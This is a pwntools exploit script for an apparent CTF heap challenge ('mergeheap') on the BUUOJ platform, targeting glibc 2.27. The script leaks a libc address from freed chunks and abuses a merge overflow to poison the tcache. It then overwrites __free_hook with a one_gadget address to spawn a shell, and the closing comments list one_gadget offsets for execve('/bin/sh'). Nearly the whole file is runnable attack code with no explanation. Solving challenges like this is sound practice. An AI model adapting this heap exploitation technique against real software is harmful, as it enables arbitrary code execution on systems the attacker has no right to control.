from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

#io=process("./mergeheap")
io=remote("node4.buuoj.cn",28348)
elf=ELF("./mergeheap")
libc=ELF("./libc-2.27.so")

def add(s,cc):
    io.sendlineafter(b">>",b"1")
    io.sendlineafter(b"len:",str(s))
    io.sendlineafter(b"content:",cc)

def show(n):
    io.sendlineafter(b">>",b"2")
    io.sendlineafter(b"idx:",str(n))
    
def delete(n):
    io.sendlineafter(b">>",b"3")
    io.sendlineafter(b"idx:",str(n))
    
def merge(n1,n2):
    io.sendlineafter(b">>",b"4")
    io.sendlineafter(b"idx1:",str(n1))
    io.sendlineafter(b"idx2:",str(n2))
    
#gdb.attach(io)
#pause()

for i in range(8):
    add(0x90,b"a")

add(0x20,b"a"*0x10) #8

for i in range(8):
    delete(i)

add(8,b"a"*8)
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x3ebd30
print("leak_addr: ",hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
realloc=leak_addr+libc.sym[b"__libc_realloc"]
free_hook=leak_addr+libc.sym[b"__free_hook"]
shell=leak_addr+0x4f322

add(0x60,b"aaa") #1
# show(1)
add(0x20,b"a"*0x20) #2
add(0x38,b"a"*0x38) #3
add(0x100,b"aaa") #4
add(0x58,b"a") #5
add(0x20,b"a") #6 
add(0x20,b"a") #7
add(0x20,b"a") #8
add(0x10,b"a") #9

delete(5)
delete(7)
delete(8)

merge(2,3)

delete(6)

payload=cyclic(0x28)+p64(0x31)+p64(free_hook)+p64(0)
add(0x100,payload)

add(0x20,b"a")
add(0x20,b"a")
add(0x20,p64(shell))

delete(4)

io.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

